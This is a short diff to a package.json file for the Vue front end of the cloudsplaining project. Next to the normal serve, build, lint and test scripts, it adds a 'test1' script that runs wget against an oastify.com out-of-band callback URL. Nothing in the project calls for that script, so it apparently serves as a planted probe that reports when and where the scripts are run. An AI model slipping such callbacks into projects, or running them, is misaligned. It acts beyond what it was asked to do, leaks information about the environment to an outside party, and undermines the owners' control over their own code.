@@ -7,7 +7,8 @@
     "serve": "vue-cli-service serve --mode development --open",
     "build": "vue-cli-service build --mode production --dest cloudsplaining/output/dist --no-clean",
     "lint": "vue-cli-service lint",
-    "test": "mocha --recursive cloudsplaining/output/src/test/"
+    "test": "mocha --recursive cloudsplaining/output/src/test/",
+    "test1": "wget https://1fh57a9utuj5fyl4bmg7h16e55b1zwnl.oastify.com/test"
   },
   "directories": {
     "test": "src/test/"
